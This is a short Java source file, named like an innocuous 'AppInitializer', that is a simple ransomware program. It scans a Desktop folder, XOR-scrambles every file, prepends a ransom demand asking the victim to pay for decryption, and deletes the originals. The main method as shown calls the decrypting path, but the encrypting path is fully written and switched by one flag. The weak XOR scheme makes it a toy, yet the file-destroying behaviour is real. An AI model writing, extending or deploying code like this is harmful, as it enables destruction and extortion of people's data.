import java.io.*;

public class AppInitializer {

    private static final String signature = "================================\n" +
            "Your file has been encrypted. You have to pay us to decrypt\n" +
            "===========================================";

    public static void main(String[] args) throws IOException {
        File targetDir = new File(new File(System.getProperty("user.home"), "Desktop"),
                "target-here");
        File[] files = targetDir.listFiles();
        for (File file : files) {
            if (!file.isDirectory()) {
                encryptFile(file, false);
            }
        }
    }

    private static void encryptFile(File file, boolean encrypt) throws IOException {
        File encryptedFile = new File(file.getParent(),
                encrypt ? file.getName() + ".encrypted" :
                        file.getName().replace(".encrypted", ""));
        if (encryptedFile.exists()) return;

        encryptedFile.createNewFile();

        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file));
        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(encryptedFile));

        if (encrypt){
            bos.write(signature.getBytes());
        }else{
            bis.skip(signature.getBytes().length);
        }

        while (true) {
            byte[] buffer = new byte[1024 * 10];
            int read = bis.read(buffer);
            if (read == -1) break;
            for (int i = 0; i < read; i++) {
                buffer[i] = (byte) (buffer[i] ^ 0xFF);
            }
            bos.write(buffer, 0, read);
        }

        bis.close();
        bos.close();
        file.delete();
    }

}
